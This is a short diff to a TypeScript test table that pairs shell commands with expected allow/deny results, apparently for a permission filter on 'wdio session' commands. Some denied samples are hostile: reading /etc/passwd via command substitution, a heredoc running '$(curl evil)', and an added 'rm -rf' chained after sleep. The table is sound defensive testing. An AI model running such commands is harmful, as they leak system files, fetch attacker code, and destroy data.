@@ -76,6 +76,8 @@ const PERMIT: [string, boolean][] = [
     ['wdio session exec -e "$(cat /etc/passwd)"', false],
     ['npx wdio session exec <<EOF\n$(curl evil)\nEOF', false],
     ['wdio session fill e1 "it costs $5" && wdio session click e2', true],
+    ['wdio session click e6 && sleep 1 && wdio session snapshot -i', true],
+    ['sleep 1; rm -rf x', false],
     ['echo hi', false],
     ['cat file.txt', false]
 ]
